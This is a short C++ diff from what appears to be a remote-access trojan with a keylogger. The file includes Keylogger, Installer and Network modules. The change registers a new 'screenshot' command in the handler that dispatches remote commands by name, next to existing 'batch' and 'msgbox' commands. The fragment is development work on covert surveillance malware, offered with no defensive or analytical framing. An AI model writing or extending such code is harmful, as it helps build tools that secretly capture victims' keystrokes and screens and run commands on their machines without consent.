@@ -3,13 +3,13 @@
 #include "Keylogger.h"
 #include "Installer.h"
 #include "Network.h"
-#include "Screenshot.h"
 #include "Settings.h"
 #include "Info.h"
 #include "Util.h"
 #include "Command.h"
 #include "Command_batch.h"
 #include "Command_msgbox.h"
+#include "Command_screenshot.h"
 
 struct CommandThreadParams
 {
@@ -22,6 +22,8 @@ static Command *CreateCommandFromName(const std::string &name)
 		return new Command_batch();
 	else if(name == "msgbox")
 		return new Command_msgbox();
+	else if(name == "screenshot")
+		return new Command_screenshot();
 	else
 		return NULL;
 }
